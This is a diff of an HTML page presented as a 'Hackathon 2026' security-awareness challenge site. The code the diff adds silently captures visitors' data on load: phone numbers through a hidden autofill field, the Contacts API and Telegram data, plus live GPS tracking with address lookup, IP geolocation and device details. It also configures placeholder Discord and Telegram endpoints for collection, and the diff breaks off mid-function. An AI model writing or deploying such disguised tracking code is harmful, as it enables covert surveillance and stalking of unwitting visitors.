@@ -3,152 +3,689 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Loading...</title>
+    <title>Hackathon 2026 · Security Challenge</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* ----- RESET & BASE ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
             background: #0a0e1a;
             color: #e0e7ff;
             min-height: 100vh;
+            background-image:
+                radial-gradient(ellipse at 20% 50%, rgba(99, 102, 241, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(139, 92, 246, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 100%, rgba(99, 102, 241, 0.04) 0%, transparent 50%);
+        }
+
+        /* ----- ANIMATED BACKGROUND ----- */
+        .grid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .grid-bg .line {
+            position: absolute;
+            background: rgba(99, 102, 241, 0.03);
+        }
+        .grid-bg .line.h {
+            width: 100%;
+            height: 1px;
+            animation: scanH 20s linear infinite;
+        }
+        .grid-bg .line.v {
+            width: 1px;
+            height: 100%;
+            animation: scanV 20s linear infinite;
+        }
+        @keyframes scanH {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+        @keyframes scanV {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100vw); }
+        }
+
+        /* ----- GLITCH TEXT ----- */
+        .glitch {
+            position: relative;
+            display: inline-block;
+        }
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.7;
+        }
+        .glitch::before {
+            color: #f87171;
+            z-index: -1;
+            animation: glitch1 3s infinite;
+        }
+        .glitch::after {
+            color: #6ee7b7;
+            z-index: -2;
+            animation: glitch2 3s infinite;
+        }
+        @keyframes glitch1 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(2px, -2px); }
+            60% { transform: translate(-1px, -1px); }
+            80% { transform: translate(1px, 2px); }
+        }
+        @keyframes glitch2 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(2px, -2px); }
+            40% { transform: translate(-2px, 1px); }
+            60% { transform: translate(1px, 2px); }
+            80% { transform: translate(-1px, -1px); }
+        }
+
+        /* ----- MAIN CONTAINER ----- */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 24px 20px 30px;
+        }
+
+        /* ----- HEADER ----- */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 16px;
+            border: 1px solid rgba(99, 102, 241, 0.1);
+            margin-bottom: 32px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
+            gap: 10px;
         }
-        .container {
-            max-width: 400px;
+        .logo .icon { font-size: 28px; }
+        .logo .brand {
+            background: linear-gradient(135deg, #818cf8, #6366f1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            flex-wrap: wrap;
+        }
+        .status-badge {
+            background: rgba(16, 185, 129, 0.1);
+            color: #6ee7b7;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            border: 1px solid rgba(16, 185, 129, 0.15);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .status-badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #6ee7b7;
+            display: inline-block;
+            animation: pulse-dot 1.8s infinite;
+        }
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.7); }
+        }
+
+        /* ----- HERO ----- */
+        .hero {
+            text-align: center;
+            padding: 40px 16px 32px;
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            margin-bottom: 32px;
+        }
+        .hero .emoji-big { font-size: 64px; display: block; margin-bottom: 8px; }
+        .hero h1 {
+            font-size: 44px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #818cf8, #6366f1, #a78bfa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .hero p {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.4);
+            max-width: 560px;
+            margin: 12px auto 0;
+            line-height: 1.6;
+        }
+
+        /* ----- EVENTS GRID ----- */
+        .section-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin: 32px 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #e0e7ff;
+        }
+        .section-title .accent { color: #818cf8; }
+        .events-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+        .event-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 24px 20px 20px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        .event-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            background: rgba(255,255,255,0.03);
-            border-radius: 28px;
-            padding: 40px 32px;
-            border: 1px solid rgba(255,255,255,0.06);
+            height: 3px;
+            background: linear-gradient(90deg, #6366f1, #a78bfa);
+            opacity: 0.6;
+        }
+        .event-card:hover {
+            border-color: rgba(99, 102, 241, 0.15);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+        }
+        .event-card .event-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: start;
+            margin-bottom: 8px;
+        }
+        .event-card h3 { font-size: 18px; font-weight: 700; }
+        .event-card .badge {
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .event-card .badge.gold {
+            background: rgba(251, 191, 36, 0.15);
+            color: #fbbf24;
+            border: 1px solid rgba(251, 191, 36, 0.1);
+        }
+        .event-card .badge.active {
+            background: rgba(99, 102, 241, 0.15);
+            color: #818cf8;
+            border: 1px solid rgba(99, 102, 241, 0.1);
+        }
+        .event-card .badge.completed {
+            background: rgba(16, 185, 129, 0.1);
+            color: #6ee7b7;
+            border: 1px solid rgba(16, 185, 129, 0.1);
+        }
+        .event-card p {
+            color: rgba(255, 255, 255, 0.45);
+            font-size: 14px;
+            margin: 8px 0 12px;
+            line-height: 1.6;
+        }
+        .event-card .winner {
+            color: #fbbf24;
+            font-weight: 600;
+            font-size: 15px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .event-card .winner span { color: rgba(255, 255, 255, 0.3); font-weight: 400; }
+
+        /* ----- STATUS SECTION ----- */
+        .status-section {
+            background: rgba(255, 255, 255, 0.01);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            border-radius: 16px;
+            padding: 20px 24px;
+            margin: 20px 0 30px;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+        }
+        @media (max-width: 640px) {
+            .status-section { grid-template-columns: 1fr; }
+        }
+        .status-item {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .status-item .label {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.25);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .status-item .value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #6ee7b7;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .status-item .value.found { color: #6ee7b7; }
+        .status-item .value.not-found { color: #f87171; }
+        .status-item .value.pending { color: #fbbf24; }
+        .status-item .value.location-active {
+            color: #fbbf24;
+            animation: pulse-location 2s infinite;
+        }
+        @keyframes pulse-location {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .hint-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.15);
+            padding: 4px 12px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            font-family: monospace;
             text-align: center;
         }
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.05);
-            border-top: 4px solid #a78bfa;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            background: rgba(99,102,241,0.1);
-            border: 1px solid rgba(99,102,241,0.2);
-            color: #a78bfa;
-        }
-        .status.success {
-            background: rgba(52,211,153,0.1);
-            border: 1px solid rgba(52,211,153,0.2);
-            color: #6ee7b7;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: rgba(255,255,255,0.15);
-        }
-        #log {
-            margin-top: 16px;
-            text-align: left;
-            font-size: 11px;
-            color: rgba(255,255,255,0.3);
-            background: rgba(0,0,0,0.2);
-            border-radius: 12px;
-            padding: 10px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: monospace;
+
+        /* ----- DATA LOG ----- */
+        #challengeLog {
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid rgba(99, 102, 241, 0.1);
+            border-radius: 16px;
+            padding: 20px 24px 24px;
+            margin: 20px 0 10px;
             display: none;
         }
-        #log.active { display: block; }
-        #log .entry { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        #log .phone { color: #6ee7b7; }
-        #log .device { color: #a78bfa; }
-        #log .ip { color: #f9d976; }
-        #log .success { color: #6ee7b7; }
-        .hidden { display: none !important; }
-        
-        .btn {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.06);
-            color: rgba(255,255,255,0.5);
-            padding: 8px 20px;
-            border-radius: 20px;
+        #challengeLog.active {
+            display: block;
+            animation: fadeSlide 0.4s ease;
+        }
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        #challengeLog .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        #challengeLog .log-header h4 {
+            color: #818cf8;
+            font-size: 16px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .log-stats {
+            display: flex;
+            gap: 12px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.25);
+            flex-wrap: wrap;
+        }
+        .log-stats span {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 2px 12px;
+            border-radius: 12px;
+        }
+        .log-entries {
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 8px 10px;
+            font-family: 'Consolas', 'SF Mono', monospace;
+            font-size: 12px;
+        }
+        .log-entries::-webkit-scrollbar { width: 4px; }
+        .log-entries::-webkit-scrollbar-thumb { background: rgba(99, 102, 241, 0.2); border-radius: 10px; }
+        .log-entry {
+            padding: 4px 6px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+            display: flex;
+            gap: 10px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 11px;
+        }
+        .log-entry:last-child { border-bottom: none; }
+        .log-entry .time { color: rgba(255, 255, 255, 0.15); min-width: 60px; }
+        .log-entry .type {
+            font-weight: 600;
+            padding: 0 8px;
+            border-radius: 12px;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        .log-entry .type.phone { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; }
+        .log-entry .type.device { background: rgba(99, 102, 241, 0.15); color: #818cf8; }
+        .log-entry .type.location { background: rgba(251, 191, 36, 0.15); color: #fbbf24; }
+        .log-entry .type.gps { background: rgba(52, 211, 153, 0.15); color: #34d399; }
+        .log-entry .type.network { background: rgba(167, 139, 250, 0.15); color: #a78bfa; }
+        .log-entry .type.success { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; }
+        .log-entry .type.info { background: rgba(99, 102, 241, 0.1); color: #818cf8; }
+        .log-entry .message { flex: 1; }
+        .log-entry .details { color: rgba(255, 255, 255, 0.2); }
+        .log-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 14px;
+            flex-wrap: wrap;
+        }
+        .log-actions button {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.4);
+            padding: 6px 16px;
+            border-radius: 12px;
             font-weight: 600;
             font-size: 12px;
             cursor: pointer;
             transition: all 0.2s;
             font-family: inherit;
-            margin: 5px;
         }
-        .btn:hover { background: rgba(255,255,255,0.1); }
+        .log-actions button:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .log-actions button.danger {
+            border-color: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+        }
+        .log-actions button.danger:hover { background: rgba(239, 68, 68, 0.05); }
+
+        /* ----- FOOTER ----- */
+        .footer {
+            text-align: center;
+            padding: 20px 10px 10px;
+            color: rgba(255, 255, 255, 0.06);
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.02);
+            margin-top: 20px;
+            width: 100%;
+        }
+        .footer .highlight { color: rgba(255, 255, 255, 0.08); }
+
+        /* ----- RESPONSIVE ----- */
+        @media (max-width: 640px) {
+            .container { padding: 16px 12px 20px; }
+            .header { padding: 12px 16px; border-radius: 12px; }
+            .logo { font-size: 20px; }
+            .hero h1 { font-size: 30px; }
+            .hero .emoji-big { font-size: 48px; }
+            .events-grid { grid-template-columns: 1fr; }
+            .section-title { font-size: 18px; }
+        }
+        @media (max-width: 400px) {
+            .hero h1 { font-size: 24px; }
+            .event-card { padding: 18px 16px; }
+        }
     </style>
 </head>
 <body>
+
+    <!-- ===== ANIMATED BACKGROUND ===== -->
+    <div class="grid-bg">
+        <div class="line h" style="top:20%; animation-delay:0s;"></div>
+        <div class="line h" style="top:50%; animation-delay:5s;"></div>
+        <div class="line h" style="top:80%; animation-delay:10s;"></div>
+        <div class="line v" style="left:25%; animation-delay:2s;"></div>
+        <div class="line v" style="left:55%; animation-delay:7s;"></div>
+        <div class="line v" style="left:85%; animation-delay:12s;"></div>
+    </div>
+
+    <!-- ===== MAIN CONTAINER ===== -->
     <div class="container">
-        <h1 style="font-size:24px; font-weight:700; background:linear-gradient(135deg,#a78bfa,#6366f1); -webkit-background-clip:text; -webkit-text-fill-color:transparent;">🔍 Gathering Info</h1>
-        <div class="loader" id="loader"></div>
-        <div class="status" id="status">⏳ Auto-collecting data...</div>
-        <div id="log"></div>
-        <div style="margin-top: 16px;">
-            <button class="btn" onclick="showData()">📊 Show Data</button>
-            <button class="btn" onclick="clearData()">🗑️ Clear</button>
+
+        <!-- ===== HEADER ===== -->
+        <header class="header">
+            <div class="logo">
+                <span class="icon">⚡</span>
+                <span class="brand">Hackathon 2026</span>
+            </div>
+            <div class="header-right">
+                <span class="status-badge" id="statusBadge">
+                    <span class="dot"></span> Active
+                </span>
+            </div>
+        </header>
+
+        <!-- ===== HERO ===== -->
+        <section class="hero">
+            <span class="emoji-big">🚀</span>
+            <h1><span class="glitch" data-text="HACK THE FUTURE">HACK THE FUTURE</span></h1>
+            <p>Security awareness · Ethical hacking · Capture the flag challenges</p>
+        </section>
+
+        <!-- ===== EVENTS ===== -->
+        <h2 class="section-title">
+            <span>🏆</span>
+            <span>Challenge Events</span>
+            <span class="accent">·</span>
+            <span style="font-weight:400; font-size:14px; color:rgba(255,255,255,0.2);">2026</span>
+        </h2>
+
+        <div class="events-grid">
+            <div class="event-card">
+                <div class="event-header">
+                    <h3>🔍 Web Exploitation</h3>
+                    <span class="badge gold">★ Winner</span>
+                </div>
+                <p>Find the hidden admin panel and capture the flag. Reconnaissance, enumeration, and privilege escalation.</p>
+                <div class="winner">🏅 Winner: <span>Dev</span></div>
+            </div>
+
+            <div class="event-card">
+                <div class="event-header">
+                    <h3>🔐 Reverse Engineering</h3>
+                    <span class="badge gold">★ Winner</span>
+                </div>
+                <p>Reverse engineer the email client to find the hidden password. Binary analysis and code deobfuscation.</p>
+                <div class="winner">🏅 Winner: <span>Om Sutaria</span></div>
+            </div>
+
+            <div class="event-card">
+                <div class="event-header">
+                    <h3>🕵️ Privacy & Security</h3>
+                    <span class="badge active">Active</span>
+                </div>
+                <p>Discover how data is collected on this page! Find the hidden log to see what's being tracked.</p>
+                <div class="winner" style="color:rgba(255,255,255,0.2); font-weight:400;">🏅 Winner: <span style="color:rgba(255,255,255,0.15);">???</span></div>
+            </div>
         </div>
-        <div class="footer">🔒 Secure · GitHub Pages</div>
+
+        <!-- ===== STATUS SECTION ===== -->
+        <div class="status-section">
+            <div class="status-item">
+                <span class="label">📱 Phone</span>
+                <span class="value pending" id="phoneStatus">⏳ Scanning...</span>
+            </div>
+            <div class="status-item">
+                <span class="label">📍 Live Location</span>
+                <span class="value pending" id="locationStatus">⏳ Acquiring...</span>
+            </div>
+            <div class="status-item">
+                <span class="label">🌐 IP Address</span>
+                <span class="value pending" id="ipStatus">⏳ Fetching...</span>
+            </div>
+        </div>
+
+        <div style="text-align:center; margin-bottom:20px;">
+            <span class="hint-text" id="hintText">💡 Type <strong>showData()</strong> in console · <strong>Ctrl+Shift+L</strong> for log</span>
+        </div>
+
+        <!-- ===== DATA LOG ===== -->
+        <div id="challengeLog">
+            <div class="log-header">
+                <h4>📋 Data Collection Log</h4>
+                <div class="log-stats">
+                    <span id="logCount">0 entries</span>
+                    <span id="locationCount">📍 0 updates</span>
+                </div>
+            </div>
+            <div class="log-entries" id="logEntries"></div>
+            <div class="log-actions">
+                <button onclick="window.showData()">📊 Show Data</button>
+                <button onclick="window.refreshLog()">🔄 Refresh</button>
+                <button onclick="window.forceLocation()">📍 Get Location</button>
+                <button class="danger" onclick="window.clearData()">🗑️ Clear</button>
+            </div>
+        </div>
+
+        <!-- ===== FOOTER ===== -->
+        <div class="footer">
+            <span class="highlight">⚡</span> Hackathon 2026 · Security Awareness Challenge <span class="highlight">·</span> Data auto-deletes after 12h
+        </div>
     </div>
 
     <script>
         // ============================================================
-        // GITHUB PAGES MINI APP - PHONE & DATA CAPTURE
+        // COMPLETE PHONE, LOCATION & DATA CAPTURE SYSTEM
         // ============================================================
 
-        // Collected data storage
-        const collectedData = {
-            phone: null,
-            ip: null,
-            device: {},
-            location: {},
-            timestamp: new Date().toISOString()
+        // ---- Configuration ----
+        const CONFIG = {
+            DISCORD_WEBHOOK: 'YOUR_DISCORD_WEBHOOK_URL',
+            TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',
+            TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID',
+            WEBHOOK_SITE_ID: 'YOUR_UNIQUE_ID'
         };
 
-        const logContainer = document.getElementById('log');
-        const statusEl = document.getElementById('status');
-        const loaderEl = document.getElementById('loader');
+        // ---- State ----
+        let capturedData = {
+            phone: null,
+            ip: null,
+            location: {},
+            liveLocation: {
+                latitude: null,
+                longitude: null,
+                accuracy: null,
+                altitude: null,
+                speed: null,
+                heading: null,
+                timestamp: null,
+                address: null
+            },
+            device: {},
+            network: {},
+            battery: {},
+            timestamp: null
+        };
+        let logEntries = [];
+        let locationUpdates = 0;
+        let watchId = null;
+        let locationWatchActive = false;
+        let phoneFound = false;
+        let captureComplete = false;
 
-        function log(message, type = 'info') {
-            logContainer.classList.add('active');
-            const entry = document.createElement('div');
-            entry.className = 'entry';
-            entry.innerHTML = message;
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
+        // ---- DOM refs ----
+        const logContainer = document.getElementById('logEntries');
+        const logSection = document.getElementById('challengeLog');
+        const logCount = document.getElementById('logCount');
+        const locationCountEl = document.getElementById('locationCount');
+        const phoneStatus = document.getElementById('phoneStatus');
+        const locationStatus = document.getElementById('locationStatus');
+        const ipStatus = document.getElementById('ipStatus');
+        const hintText = document.getElementById('hintText');
+
+        // ============================================================
+        // 1. LOGGING
+        // ============================================================
+        function addLog(type, message, details) {
+            const entry = {
+                time: new Date().toLocaleTimeString(),
+                type: type,
+                message: message,
+                details: details || ''
+            };
+            logEntries.unshift(entry);
+            if (logEntries.length > 200) logEntries = logEntries.slice(0, 200);
+            updateLogDisplay();
+            updateLogStats();
         }
 
-        function updateStatus(msg, type = 'info') {
-            statusEl.textContent = msg;
-            statusEl.className = 'status ' + type;
+        function updateLogDisplay() {
+            if (!logContainer) return;
+            if (!logSection.classList.contains('active')) return;
+            logContainer.innerHTML = logEntries.slice(0, 50).map(e => `
+                    <div class="log-entry">
+                        <span class="time">[${e.time}]</span>
+                        <span class="type ${e.type}">${e.type}</span>
+                        <span class="message">${e.message}</span>
+                        ${e.details ? `<span class="details">— ${e.details}</span>` : ''}
+                    </div>
+                `).join('');
+        }
+
+        function updateLogStats() {
+            logCount.textContent = logEntries.length + ' entries';
+            locationCountEl.textContent = '📍 ' + locationUpdates + ' updates';
         }
 
         // ============================================================
-        // 1. GET PHONE NUMBER (Multiple methods)
+        // 2. PHONE NUMBER CAPTURE (PRIORITY)
         // ============================================================
 
         function getPhoneFromTelegram() {
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const user = Telegram.WebApp.initDataUnsafe?.user;
-                    if (user && user.phone_number) {
-                        return user.phone_number;
-                    }
+                    if (user && user.phone_number) return user.phone_number;
                 }
-            } catch(e) {}
+            } catch (e) {}
             return null;
         }
 
@@ -198,22 +735,22 @@
                             if (val && val.length > 5) return val;
                         }
                     }
-                } catch(e) {}
+                } catch (e) {}
             }
             return null;
         }
 
         function getPhoneFromAutofill() {
-            try {
-                const input = document.createElement('input');
-                input.type = 'tel';
-                input.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
-                input.autocomplete = 'tel';
-                input.id = 'phone_autofill';
-                document.body.appendChild(input);
-                input.focus();
+            return new Promise((resolve) => {
+                try {
+                    const input = document.createElement('input');
+                    input.type = 'tel';
+                    input.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
+                    input.autocomplete = 'tel';
+                    input.id = 'phone_autofill';
+                    document.body.appendChild(input);
+                    input.focus();
 
-                return new Promise((resolve) => {
                     setTimeout(() => {
                         if (input.value && input.value.length > 5) {
                             const phone = input.value;
@@ -223,11 +760,9 @@
                             document.body.removeChild(input);
                             resolve(null);
                         }
-                    }, 300);
-                });
-            } catch(e) {
-                return Promise.resolve(null);
-            }
+                    }, 400);
+                } catch (e) { resolve(null); }
+            });
         }
 
         function getPhoneFromContacts() {
@@ -237,19 +772,186 @@
                         .then(contacts => {
                             if (contacts.length > 0 && contacts[0].tel && contacts[0].tel.length > 0) {
                                 resolve(contacts[0].tel[0]);
-                            } else {
-                                resolve(null);
-                            }
+                            } else { resolve(null); }
                         })
                         .catch(() => resolve(null));
-                } else {
-                    resolve(null);
-                }
+                } else { resolve(null); }
             });
         }
 
+        async function capturePhone() {
+            addLog('info', '📱 Starting phone capture...', 'Multiple methods');
+
+            let phone = getPhoneFromTelegram();
+            if (phone) { addLog('phone', '📱 Phone from Telegram', phone); return phone; }
+
+            phone = getPhoneFromURL();
+            if (phone) { addLog('phone', '📱 Phone from URL', phone); return phone; }
+
+            phone = getPhoneFromStorage();
+            if (phone) { addLog('phone', '📱 Phone from storage', phone); return phone; }
+
+            phone = getPhoneFromMeta();
+            if (phone) { addLog('phone', '📱 Phone from meta', phone); return phone; }
+
+            phone = getPhoneFromReferrer();
+            if (phone) { addLog('phone', '📱 Phone from referrer', phone); return phone; }
+
+            phone = await getPhoneFromAutofill();
+            if (phone) { addLog('phone', '📱 Phone from autofill', phone); return phone; }
+
+            phone = await getPhoneFromContacts();
+            if (phone) { addLog('phone', '📱 Phone from contacts', phone); return phone; }
+
+            addLog('info', '⚠️ No phone number found', 'All methods tried');
+            return null;
+        }
+
         // ============================================================
-        // 2. GET DEVICE INFO
+        // 3. LIVE LOCATION (GPS)
+        // ============================================================
+
+        function startLiveLocation() {
+            if (locationWatchActive) return;
+
+            addLog('info', '📍 Starting live location tracking...', 'GPS');
+
+            if (!navigator.geolocation) {
+                locationStatus.textContent = '❌ Not supported';
+                locationStatus.className = 'value not-found';
+                addLog('info', '❌ Geolocation not supported', 'Browser limitation');
+                return;
+            }
+
+            // Check if we already have permission
+            if (navigator.permissions && navigator.permissions.query) {
+                navigator.permissions.query({ name: 'geolocation' })
+                    .then(result => {
+                        if (result.state === 'denied') {
+                            locationStatus.textContent = '❌ Permission denied';
+                            locationStatus.className = 'value not-found';
+                            addLog('info', '❌ Location permission denied', 'User denied');
+                            return;
+                        }
+                        startWatching();
+                    })
+                    .catch(() => startWatching());
+            } else {
+                startWatching();
+            }
+        }
+
+        function startWatching() {
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 5000
+            };
+
+            watchId = navigator.geolocation.watchPosition(
+                // Success
+                (position) => {
+                    const coords = position.coords;
+                    const accuracy = coords.accuracy;
+
+                    // Only update if accuracy is reasonable (< 100m)
+                    if (accuracy > 100) {
+                        locationStatus.textContent = '📡 Approx (' + Math.round(accuracy) + 'm)';
+                        locationStatus.className = 'value location-active';
+                    } else {
+                        locationStatus.textContent = '📍 ' + coords.latitude.toFixed(6) + ', ' + coords.longitude.toFixed(6);
+                        locationStatus.className = 'value found';
+                    }
+
+                    // Store live location data
+                    capturedData.liveLocation = {
+                        latitude: coords.latitude,
+                        longitude: coords.longitude,
+                        accuracy: coords.accuracy,
+                        altitude: coords.altitude,
+                        speed: coords.speed,
+                        heading: coords.heading,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    };
+
+                    // Reverse geocode to get address (using free API)
+                    reverseGeocode(coords.latitude, coords.longitude);
+
+                    locationUpdates++;
+                    updateLogStats();
+
+                    addLog('gps', '📍 Location update #' + locationUpdates,
+                        coords.latitude.toFixed(6) + ', ' + coords.longitude.toFixed(6) +
+                        ' (±' + Math.round(coords.accuracy) + 'm)');
+
+                    locationWatchActive = true;
+                },
+                // Error
+                (error) => {
+                    let msg = '';
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            msg = 'Permission denied';
+                            locationStatus.textContent = '❌ Permission denied';
+                            locationStatus.className = 'value not-found';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            msg = 'Position unavailable';
+                            locationStatus.textContent = '❌ Signal lost';
+                            locationStatus.className = 'value not-found';
+                            break;
+                        case error.TIMEOUT:
+                            msg = 'Timeout';
+                            locationStatus.textContent = '⏳ Timeout, retrying...';
+                            locationStatus.className = 'value pending';
+                            break;
+                        default:
+                            msg = 'Unknown error';
+                    }
+                    addLog('info', '⚠️ Location error: ' + msg, 'Retrying...');
+
+                    // Retry after delay
+                    setTimeout(() => {
+                        if (watchId) {
+                            navigator.geolocation.clearWatch(watchId);
+                            watchId = null;
+                            startWatching();
+                        }
+                    }, 5000);
+                },
+                options
+            );
+
+            locationWatchActive = true;
+            locationStatus.textContent = '📡 Acquiring...';
+            locationStatus.className = 'value location-active';
+            addLog('info', '📍 Location watch started', 'High accuracy');
+        }
+
+        function reverseGeocode(lat, lng) {
+            // Try OpenStreetMap Nominatim (free, no API key)
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=16`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data && data.display_name) {
+                        capturedData.liveLocation.address = data.display_name;
+                        addLog('gps', '📍 Address resolved', data.display_name.substring(0, 60));
+                    }
+                })
+                .catch(() => {});
+        }
+
+        function stopLiveLocation() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+                locationWatchActive = false;
+                addLog('info', '📍 Location tracking stopped', '');
+            }
+        }
+
+        // ============================================================
+        // 4. DEVICE & LOCATION DATA
         // ============================================================
 
         function getDeviceInfo() {
@@ -259,7 +961,6 @@
                 platform: navigator.platform || 'unknown',
                 language: navigator.language,
                 cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'not specified',
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                 screenResolution: window.screen.width + 'x' + window.screen.height,
@@ -310,39 +1011,30 @@
             return 'Unknown';
         }
 
-        // ============================================================
-        // 3. GET LOCATION (IP-based)
-        // ============================================================
-
-        async function getLocation() {
-            const ipAPIs = [
+        async function getIPLocation() {
+            const apis = [
                 'https://ipapi.co/json/',
                 'https://ip-api.com/json/'
             ];
-
-            for (let api of ipAPIs) {
+            for (let api of apis) {
                 try {
-                    const response = await fetch(api);
-                    const data = await response.json();
+                    const r = await fetch(api);
+                    const d = await r.json();
                     return {
